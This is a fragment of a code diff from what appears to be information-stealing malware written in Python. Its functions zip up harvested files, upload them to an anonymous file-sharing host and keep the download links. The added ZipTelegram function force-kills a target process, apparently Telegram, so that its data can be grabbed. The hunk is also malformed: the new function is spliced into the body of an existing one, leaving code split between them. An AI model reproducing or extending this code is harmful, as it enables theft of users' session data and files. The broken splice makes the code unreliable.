@@ -715,6 +715,13 @@ def GatherZips(paths1, paths2, paths3):
     zf.close()
 
     lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
+      
+def ZipTelegram(path, arg, procc):
+    global OtherZip
+    pathC = path
+    name = arg
+    if not os.path.exists(pathC): return
+    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True) 
     
     os.remove(f"{pathC}/{name}.zip")
     OtherZip.append([arg, lnik])
